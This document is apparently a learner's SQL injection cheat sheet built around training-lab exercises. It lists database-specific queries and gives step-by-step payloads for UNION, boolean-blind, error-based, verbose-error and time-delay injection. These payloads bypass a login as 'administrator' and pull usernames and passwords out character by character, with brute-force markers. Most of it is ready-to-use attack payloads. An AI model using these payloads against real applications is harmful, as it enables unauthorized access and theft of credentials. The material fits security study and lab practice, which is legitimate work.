-----------------------
step for sql injection
-----------------------
1. find how many column exists in database.
2. find which column have char or int.
3. find which database or its version uses server.
4. find table name and column name using above info and make playload.
5. find which injection are needed for attack. ex:- union,error base,blind,etc...
6. follow and understand above step and find playload for retrieve data.

------
NOTE:-
------
DATABASE VERSION:-
You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

Oracle 	        SELECT banner FROM v$version
                SELECT version FROM v$instance
Microsoft 	SELECT @@version
PostgreSQL 	SELECT version()
MySQL 	        SELECT @@version 

DATABASE CONTENTS:-
You can list the tables that exist in the database, and the columns that those tables contain.

Oracle 	        SELECT * FROM all_tables
                SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft 	SELECT * FROM information_schema.tables
                SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL 	SELECT * FROM information_schema.tables
                SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL 	        SELECT * FROM information_schema.tables
                SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
                COMMENTS:-

You can use comments to truncate a query and remove the portion of the original query that follows your input.
Oracle 	        --comment
Microsoft 	--comment
                /*comment*/
PostgreSQL 	--comment
                /*comment*/ 	        
MySQL           -- comment [Note the space after the double dash]
                /*comment*/
                
SUBSTRING:-
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.

Oracle 	      SUBSTR('foobar', 4, 2)
Microsoft     SUBSTRING('foobar', 4, 2)
PostgreSQL    SUBSTRING('foobar', 4, 2)
MySQL 	      SUBSTRING('foobar', 4, 2) 

STRING CONCATENATION:-
You can concatenate together multiple strings to make a single string.
Oracle 	        'foo'||'bar'
Microsoft 	'foo'+'bar'
PostgreSQL 	'foo'||'bar'
MySQL 	        'foo' 'bar' [Note the space between the two strings]
                CONCAT('foo','bar')
                
------------------------------------------------------------------------------------------------------------------------------------
SQL INJECTION IN DIFFERENT PARTS OF THE QUERY

Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query. Most experienced testers are familiar with this type of SQL injection.

However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

    In UPDATE statements, within the updated values or the WHERE clause.
    In INSERT statements, within the inserted values.
    In SELECT statements, within the table or column name.
    In SELECT statements, within the ORDER BY clause.
    
SQL INJECTION EXAMPLES

There are lots of SQL injection vulnerabilities, attacks, and techniques, that occur in different situations. Some common SQL injection examples include:

    Retrieving hidden data, where you can modify a SQL query to return additional results.
    Subverting application logic, where you can change a query to interfere with the application's logic.
    UNION attacks, where you can retrieve data from different database tables.
    Blind SQL injection, where the results of a query you control are not returned in the application's responses.

SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

Crucially, note that -- is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment,

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

The modified query returns all items where either the category is Gifts, or 1 is equal to 1. As 1=1 is always true, the query returns all items. 

Subverting application logic

Imagine an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

This query returns the user whose username is administrator and successfully logs the attacker in as that user. 
------------------------------------------------------------------------------------------------------------------------------------
EXAMINING THE DATABASE IN sql INJECTION ATTACKS:-
To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
    The type and version of the database software.
    The tables and columns that the database contains.

QUERYING THE DATABASE TYPE AND VERSION:-

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries to determine the database version for some popular database types:
Database type 	        Query
Microsoft, MySQL 	SELECT @@version
Oracle 	                SELECT * FROM v$version
PostgreSQL 	        SELECT version()

For example, you could use a UNION attack with the following input:
here first find colunm no. than find version using coulmn no.

oracle           'union select banner, null from v$version--  
microsoft,mysql  'union select @@version, null# 
---------------------------------
THIS IS FOR NON-ORACLE DATABASE
---------------------------------
LISTING THE CONTENTS OF THE DATABASE:-
 Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query information_schema.tables to list the tables in the database:
SELECT table_name, null FROM information_schema.tables--

This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE

This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables: 
' union select column_name , null from information_schema.columns where table_name="users"--
 
This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar

' union select username, password from users--

This output shows the columns in the specified table and the data type of each column. 
-----------------------------
THIS IS FOR ORACLE DATA BASE
-----------------------------
using above example:-

 On Oracle, you can find the same information as follows:

    You can list tables by querying all_tables:

    ' union select table_name, null from all_tables--

    You can list columns by querying all_tab_columns:

   ' union select column_name, null from all_tab_columns where table_name='USERs'--
    you can find columns data
   ' union select USERNAME, PASSWORD from USERS
   
------
UNION
------

SQL injection UNION attacks

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example:
SELECT a, b FROM table1 UNION SELECT c, d FROM table2

This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

For a UNION query to work, two key requirements must be met:

    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

    How many columns are being returned from the original query.
    Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

DETERMINING THE NUMBER OF COLUMNS REQUIRED:

When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the WHERE clause of the original query, you would submit:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.

This series of payloads modifies the original query to order the results by different columns in the result set. The column in an ORDER BY clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

The ORDER BY position number 3 is out of range of the number of items in the select list.

 The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.

The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.

If the number of nulls does not match the number of columns, the database returns an error, such as:
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

As with the ORDER BY technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a NullPointerException. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,'||(SELECT CASE WHEN LENGTH(password)>25 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

If the column data type is not compatible with string data, the injected query will cause a database error, such as:
Conversion failed when converting the varchar value 'a' to data type int.

DATABASE-SPECIFIC SYNTAX:-

On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:
' UNION SELECT NULL FROM DUAL--

The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment. 



RETRIEVING MULTIPLE VALUES WITHIN A SINGLE COLUMN:-

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
' UNION SELECT username || '~' || password FROM users--

This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.

The results from the query contain all the usernames and passwords, for example:
...
administrator~s3cure
wiener~peter
carlos~montoya
...

STRING CONCATENATION:-

You can concatenate together multiple strings to make a single string.
Oracle 	        'foo'||'bar'
Microsoft 	'foo'+'bar'
PostgreSQL 	'foo'||'bar'
MySQL 	        'foo' 'bar' [Note the space between the two strings]
                CONCAT('foo','bar')

--------------------
BLIND-SQL INJECTION
--------------------

The following techniques can be used to exploit blind SQL injection vulnerabilities, depending on the nature of the vulnerability and the database involved:

    You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.
    You can conditionally trigger a time delay in the processing of the query. This enables you to infer the truth of the condition based on the time that the application takes to respond.
    You can trigger an out-of-band network interaction, using OAST techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel. For example, you can place the data into a DNS lookup for a domain that you control.
    
SUBSTRING:-

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.

Oracle 	      SUBSTR('foobar', 4, 2)
Microsoft     SUBSTRING('foobar', 4, 2)
PostgreSQL    SUBSTRING('foobar', 4, 2)
MySQL 	      SUBSTRING('foobar', 4, 2) 
    
steps:-

1.check
  ' and '1'='1
  ' and '1'='2
2.find column no. and gether database info.
  using union injection.
3.varify table name
  ' AND (SELECT '' FROM users LIMIT 1)='
  or brute forse diff table name you need to varify on users place.
4.find username using above varified tables
  ' AND (SELECT '' FROM users WHERE username='administrator')=' 
  using brute forse on administrator place varify which username you want.
5.find length of password
  ' AND (SELECT '' FROM users WHERE username='administrator' AND LENGTH(password)>1)='
  using brute forse attack on 1 to change 50 this will find length of password.
6.find password
  ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
  ' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
  here butr forse attack this will help you to find password.
  here you also uses grep method to find appropriet respose.

--------------------------
ERROR-BASED sql INJECTION
--------------------------
Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.
Oracle 	        SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
Microsoft 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
PostgreSQL 	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
MySQL 	        SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 

steps:-
here right attribute in capital words.
1.check sql vuln.
  '
  ''
  '|| ||'
2.find databe info.
  using above conditional error playload and find database name.
3.find table name
  '||(SELECT '' FROM users WHERE ROWNUM = 1)||'
  here using some table name which us wanted varify them.
4.check response
  '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
  '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' 
  show the response and find pattern.
5.find username and his length of password.
  '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  '||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  first playload check username and second his password length.
6.find password
  '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  '||(SELECT CASE WHEN SUBSTR(password,2,1)='b' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  shown above playload we need to find password using bruit forse attack.

---------------------------------------------------------
EXTRACTING SENSITIVE DATA VIA VERBOSE sql ERROR MESSAGES
---------------------------------------------------------
EXTRACTING DATA VIA VISIBLE ERROR MESSAGES:-
You can potentially elicit error messages that leak sensitive data returned by your malicious query. 
Microsoft 	SELECT 'foo' WHERE 1 = (SELECT 'secret')
                > Conversion failed when converting the varchar value 'secret' to data type int.
PostgreSQL 	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
                > invalid input syntax for integer: "secret"
MySQL 	        SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
                > XPATH syntax error: '\secret'

this injection are show us to answer on response error.here are playload are uses on after tracking id.

steps:-

1.check sql vuln.
  '
  '--
  ''
  and also check above injection and show the response, when any above injection are not uses for exploite so, find vuln like verbose.
2.using cast() function to check vuln or not
  ' and cast((select'1')AS INT)--
  this give us error and uses for boolean
3.implement playload
  ' and 1=cast((select '1')AS INT)--
  this solve error
4.find username and password
  ' and 1=cast((select username from users)AS INT)--
  ' and 1=cast((select password from users)AS INT)--
  ERROR:Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'FKm34JPFfgYtu0BX' and 1=cast((select username from users lim'. Expected  char
5.  SOLUTION:-this error show us to this injection break tracking id so we need to erase tracking id before the play load and use attack.
6.implement limit in the response
  ' and 1=cast((select username from users limit 1)AS INT)--
  ' and 1=cast((select password from users limit 1)AS INT)--
  ERROR: more than one row returned by a subquery used as an expression

--------------------------------------
BLIND sql INJECTION WITH TIME DELAYS
--------------------------------------

tIME DELAYS:-
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
Oracle 	        dbms_pipe.receive_message(('a'),10)
Microsoft 	WAITFOR DELAY '0:0:10'
PostgreSQL 	SELECT pg_sleep(10)
MySQL 	        SELECT SLEEP(10) 

steps:-
1.check the which data base uses website using above injection
  ' ||pg_sleep(10)--
  this will give us 10 second delay response.
2.using blind injection to find response are give us for right answer or wrong answer
  ' ||(select case when (1=1) then pg_sleep(10) else pg_sleep(0) end)--
3.find table name
' ||(select case when (1=1) then pg_sleep(10) else pg_sleep(0) end from users)-- 
 using table_name list attack on place on users and find diif table name.  
4.find username
  ' ||(select case when (username='administrator') then pg_sleep(10) else pg_sleep(0) end from users)--
5.find legth of password
' ||(select case when (username='administrator' and length(password)>19) then pg_sleep(5) else pg_sleep(0) end from users)--
6.find password using brute force
' ||(select case when (username='administrator' and substring(password, 1, 1)='a') then pg_sleep(5) else pg_sleep(0) end from users)--
' ||(select case when (username='administrator' and substring(password, §1§, 1)='§n§') then pg_sleep(5) else pg_sleep(0) end from users)--
